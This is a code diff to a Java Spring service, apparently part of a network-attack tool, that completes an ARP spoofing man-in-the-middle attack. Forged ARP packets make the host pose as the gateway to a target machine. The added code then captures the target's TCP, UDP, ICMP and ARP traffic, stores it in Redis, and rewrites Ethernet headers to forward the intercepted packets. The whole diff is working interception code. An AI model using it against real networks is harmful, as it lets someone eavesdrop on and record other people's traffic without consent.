@@ -2,16 +2,14 @@ package com.hyc.backend.service;
 
 import com.hyc.backend.dao.RedisMapper;
 import com.hyc.backend.pojo.AttackConfig;
+import com.hyc.backend.pojo.CapturedPacket;
 import com.hyc.backend.redis.AttackKey;
 import com.hyc.backend.redis.CommonKey;
 import com.hyc.backend.utils.NetworkUtils;
 import jpcap.JpcapCaptor;
 import jpcap.JpcapSender;
 import jpcap.NetworkInterface;
-import jpcap.packet.ARPPacket;
-import jpcap.packet.EthernetPacket;
-import jpcap.packet.IPPacket;
-import jpcap.packet.Packet;
+import jpcap.packet.*;
 import org.slf4j.LoggerFactory;
 import org.springframework.beans.factory.annotation.Autowired;
 import org.springframework.stereotype.Service;
@@ -22,6 +20,7 @@ import javax.annotation.Resource;
 import java.io.IOException;
 import java.net.InetAddress;
 import java.net.UnknownHostException;
+import java.util.Arrays;
 import java.util.Date;
 import java.util.Map;
 import java.util.Set;
@@ -215,7 +214,8 @@ public class AttackService {
         //但是仍旧是线程不安全的，如果要实现线程安全，可以选择加分布式锁，即执行redis的set lock:batchid true ex 5 nx
         //这里就不实现了
         batchId++;
-
+        //主键自增并放入redis，在并发环境下，这里会存在数据库不一致问题，导致其他进程脏读！
+        redisMapper.set(CommonKey.COMMON_KEY, "batch_id", batchId);
         //设置ARP包欺骗目标主机，将自己伪装成网关
         ARPPacket arpToDst = createARPPacket(srcMACBT, gateIPIA.getAddress(), dstMACBT, dstIPIA.getAddress());
 
@@ -229,7 +229,7 @@ public class AttackService {
         //发包
         sendPacket(arpToDst, arpToGate);
         //收包并转发
-
+        receiveAndForwardingPacket();
     }
 
     private ARPPacket createARPPacket(byte[] sHardAddr, byte[] sProtoAddr,byte[] tHardAddr, byte[] tProtoAddr){
@@ -296,13 +296,9 @@ public class AttackService {
 
                                     //如果这个数据包的源IP地址是目标主机的IP地址，那么说明是上行链路的数据包
                                     if(ipPacket.src_ip.getHostAddress().equals(config.getDestIp())){
-                                        //如果这个数据包的源MAC地址是本地主机的MAC地址，说明这是我自己发送的攻击数据包，需要忽略
-                                        if(packet.datalink instanceof EthernetPacket){
-                                            EthernetPacket eth = (EthernetPacket) packet.datalink;
-                                            String macFromCap = eth.getSourceAddress();
-                                            if(!macFromCap.equalsIgnoreCase(config.getSrcMac())){
-                                                savePacket(ipPacket, true);
-                                            }
+                                        //如果这个数据包的源MAC地址是本地主机的MAC地址，说明这是我自己发送的数据包，需要忽略
+                                        if(ipPacket.datalink instanceof EthernetPacket){
+                                            savePacket(ipPacket, true);
                                         }
                                         forward(ipPacket, gateMACBT);
                                     }
@@ -316,12 +312,30 @@ public class AttackService {
 
                             //检查是否是ARP包
                             if(packet instanceof ARPPacket){
-
+                                ARPPacket arpPacket = (ARPPacket) packet;
+                                //ARP数据包中采用byte数组存储IP地址，因此需要将其转换为字符串再判断源IP地址和目地IP地址是否与过滤域有关
+                                if(isRelatedToSpecificDomains(NetworkUtils.bytesToIp(arpPacket.sender_protoaddr))
+                                || isRelatedToSpecificDomains(NetworkUtils.bytesToIp(arpPacket.target_protoaddr))){
+                                    //数据包的发送者与目标IP地址相同，说明是上行链路
+                                    if(Arrays.equals(arpPacket.sender_protoaddr, dstIPIA.getAddress())){
+                                        if(packet.datalink instanceof EthernetPacket){
+                                            EthernetPacket eth = (EthernetPacket) packet.datalink;
+                                            String macFromCap = eth.getSourceAddress();
+                                            //依旧忽略本地发送的数据包
+                                            if(!macFromCap.equalsIgnoreCase(config.getSrcMac())){
+                                                savePacket(arpPacket, true);
+                                            }
+                                        }
+                                        forward(arpPacket, gateMACBT);
+                                    }else if(Arrays.equals(arpPacket.target_protoaddr, dstIPIA.getAddress())){
+                                        savePacket(arpPacket, false);
+                                        forward(arpPacket, dstMACBT);
+                                    }
+                                }
                             }
                         }
                     }catch (Throwable e){
-
-
+                        logger.error("Unknown error in receive thread, ", e);
                     }
                 }
             }
@@ -340,7 +354,51 @@ public class AttackService {
     }
 
     private void savePacket(Packet packet, boolean isUpstream){
-        //TODO 保存数据包到redis
+        //保存数据包到redis
+        if(isUpstream){
+            upStreamNum++;
+        }else{
+            downStreamNum++;
+        }
+        CapturedPacket capturedPacket = new CapturedPacket();
+        capturedPacket.setUpStream(isUpstream);
+        capturedPacket.setBatchId(batchId);
+        capturedPacket.setStartAttackTime(startAttackTimeStamp);
+        if(packet instanceof TCPPacket){
+            capturedPacket.setPacket(new com.hyc.backend.packet.TCPPacket((TCPPacket) packet));
+            if(isUpstream){
+                upTcpNum++;
+            }else{
+                downTcpNum++;
+            }
+        }else if(packet instanceof UDPPacket){
+            capturedPacket.setPacket(new com.hyc.backend.packet.UDPPacket((UDPPacket) packet));
+            if(isUpstream){
+                upUdpNum++;
+            }else{
+                downUdpNum++;
+            }
+        }else if(packet instanceof ICMPPacket){
+            capturedPacket.setPacket(new com.hyc.backend.packet.ICMPPacket((ICMPPacket) packet));
+            if(isUpstream){
+                upIcmpNum++;
+            }else{
+                downIcmpNum++;
+            }
+        }else if(packet instanceof ARPPacket){
+            capturedPacket.setPacket(new com.hyc.backend.packet.ARPPacket((ARPPacket) packet));
+            if(isUpstream){
+                upArpNum++;
+            }else{
+                downArpNum++;
+            }
+        }
+        redisMapper.addToList(AttackKey.cap_packet, "batch_id_"+batchId+"_list", capturedPacket);
+    }
+
+    public Integer stopAttack(){
+        attacking = false;
+        return batchId;
     }
 
     /**
@@ -350,6 +408,18 @@ public class AttackService {
      */
     private void forward(Packet packet, byte[] changeMAC){
         //TODO 转发数据包
+        EthernetPacket eth = null;
+        if(packet.datalink instanceof EthernetPacket){
+            eth = (EthernetPacket) packet.datalink;
+            for(int i = 0; i < 6; ++i){
+                //修改包的以太网帧头，改变包的目标
+                eth.dst_mac[i] = changeMAC[i];
+                //源发送MAC地址改成本地主机
+                eth.src_mac[i] = mainDevice.mac_address[i];
+            }
+            if(sender != null && attacking)
+                sender.sendPacket(packet);
+        }
     }
 
 
